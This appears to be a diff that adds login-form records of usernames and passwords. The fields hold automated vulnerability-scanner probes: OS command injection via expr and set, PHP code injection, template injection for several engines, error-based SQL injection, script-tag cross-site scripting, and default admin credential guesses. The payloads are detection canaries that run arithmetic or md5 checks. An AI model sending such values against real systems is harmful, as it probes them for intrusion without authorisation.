@@ -1,0 +1,78 @@
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+expr 862919330 + 929767105
+
+User Name:rZOQlmMWPassword:1PtKRodR
+User Name:aaPassword:aa|expr 965170923 + 968235366 
+User Name:rZOQlmMWPassword:QxXxb0xA
+User Name:aaPassword:aa$(expr 897995493 + 802422279)
+User Name:rZOQlmMWPassword:ecR3nLAG
+User Name:aaPassword:aa&set /A 898582676+950864086
+User Name:adminPassword:admin
+User Name:aaPassword:${@var_dump(md5(799598439))};
+User Name:adminPassword:8gEqe
+User Name:aaPassword:'-var_dump(md5(522143745))-'
+User Name:aaPassword:/*1*/{{922848454+865382436}}
+User Name:aaPassword:${838953422+882610038}
+User Name:aaPassword:${(942571419+936487314)?c}
+User Name:aaPassword:#set($c=900221071+968835254)${c}$c
+User Name:aaPassword:<%- 879123454+992375487 %>
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aa
+expr 823942033 + 923945374
+Password:aa
+User Name:aa|expr 812365597 + 899148189 Password:aa
+User Name:aa$(expr 953364699 + 916591391)Password:aa
+User Name:aa&set /A 848726875+866571138Password:aa
+User Name:${@var_dump(md5(284039781))};Password:aa
+User Name:'-var_dump(md5(475028213))-'Password:aa
+User Name:/*1*/{{969686602+930470370}}Password:aa
+User Name:${875368181+898189866}Password:aa
+User Name:${(935122160+864144531)?c}Password:aa
+User Name:#set($c=800731371+897400455)${c}$cPassword:aa
+User Name:<%- 980494038+866508022 %>Password:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aaPassword:aa
+User Name:aa'and/**/extractvalue(1,concat(char(126),md5(1760388302)))and'Password:aa
+User Name:aaPassword:aa'and/**/extractvalue(1,concat(char(126),md5(1797334514)))and'
+User Name:aaPassword:aa
+User Name:abaasyrzazzwqkkcvlpjPassword:aa
+User Name:<xezdmcwwzr>Password:aa
+User Name:<sCrIpT>xezdmcwwzr</ScRiPt>Password:aa
+User Name:aaPassword:abaasyrzazzwqkkcvlpj
+User Name:aaPassword:<oeuhvhtupn>
+User Name:aaPassword:<sCrIpT>oeuhvhtupn</sCrIpT>
